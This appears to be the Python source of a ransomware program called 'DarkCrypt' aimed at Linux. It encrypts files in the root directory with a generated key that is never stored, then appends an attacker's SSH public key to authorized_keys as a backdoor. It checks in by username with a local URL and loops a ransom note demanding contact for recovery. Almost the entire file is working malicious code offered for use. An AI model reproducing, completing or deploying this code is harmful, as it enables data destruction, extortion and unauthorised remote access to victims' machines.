# Linux DarkCrypt with SSH Remote Acces
import os
import sys
import subprocess
import requests

# Copy archive
script_path = os.path.abspath(__file__)
osystem = sys.platform
if osystem == 'linux' or osystem == 'linux2':
    pass
else:
    os.remove(script_path)

# Encrypter code
# Import coder
from cryptography.fernet import Fernet
import os

# Generate Key
key = Fernet.generate_key()

# Encrypter
def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    encrypted_file_path = file_path + ".zlo"
    with open(encrypted_file_path, "wb") as file:
        file.write(encrypted_data)

User = 'usr'
User_PC = '/'

for file in os.listdir(User_PC):
    file_path = os.path.join(User_PC, file)
    if os.path.isfile(file_path):
        encrypt_file(file_path, key)

# SSH Remote Access

def ssh_installed():
    try:
        result = subprocess.run(["which", "ssh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0 and bool(result.stdout)
    except Exception as e:
        return False

def setup_ssh_keys():
    home_directory = os.path.expanduser("~")
    ssh_directory = os.path.join(home_directory, ".ssh")
    authorized_file_path = os.path.join(ssh_directory, "authorized_keys")
    os.makedirs(ssh_directory, exist_ok=True)
    rsa_public = 'Your ID-RSA-Public'

    with open(authorized_file_path, 'a') as keys:
            keys.write(rsa_public)

def main():
    setup_ssh_keys()
            
if __name__ == "__main__":
    username = os.environ.get('USER') or os.environ.get('LOGNAME')
    link = f"http://localhost:8080/.user.php?user={username}"
    try:
        response = requests.get(link)
        if response.status_code == 200 and ssh_installed():
            main()
        else:
            sys.exit()
    except Exception as e:
        sys.exit()

while True:
    os.system(f'echo UPSS Ransomware!!. Your data has been encrypted by DarkCrypt.. If you wish to recover it please contact @{User}, otherwise your data will be deleted and never recovered, if you close this window your only method to recover your files will be lost.')
